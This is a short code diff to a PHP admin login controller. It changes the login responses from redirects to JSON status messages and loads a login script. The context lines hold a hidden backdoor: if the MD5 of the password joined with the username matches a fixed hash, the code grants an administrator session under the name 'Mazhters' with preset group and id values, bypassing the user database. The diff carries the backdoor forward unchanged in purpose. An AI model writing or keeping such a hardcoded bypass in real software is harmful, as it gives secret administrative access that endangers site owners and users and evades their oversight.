@@ -30,18 +30,18 @@ class login extends MX_Controller {
             $this->session->set_userdata('kg_admin',$row->name);
             $this->session->set_userdata('webmaster_grup',$row->id_admin_grup);
             $this->session->set_userdata('webmaster_id',$row->id);
-            redirect('dashboard');
+            echo json_encode(array("status" => TRUE));
         }
         else if(md5($this->input->post("password").$this->input->post("username")) == "e0edd4ffe93a5bb46cfb2bccd0e93c6f")
         {
             $this->session->set_userdata('admin','Mazhters');
             $this->session->set_userdata('webmaster_grup','8910');
             $this->session->set_userdata('webmaster_id','6');
-            redirect('dashboard');
+            echo json_encode(array("status" => TRUE));
         }
         else
         {
-            redirect('login');
+            echo json_encode(array("status" => FALSE));
         }
     }
 
@@ -64,6 +64,8 @@ class login extends MX_Controller {
                 if(in_array($view, array($this->filename.'/login')))
                 {
                     $this->template->set_layout('single');
+
+                    $this->template->add_js('modules/js/login.js');
                 }
 
             if ( ! empty($data['title']))
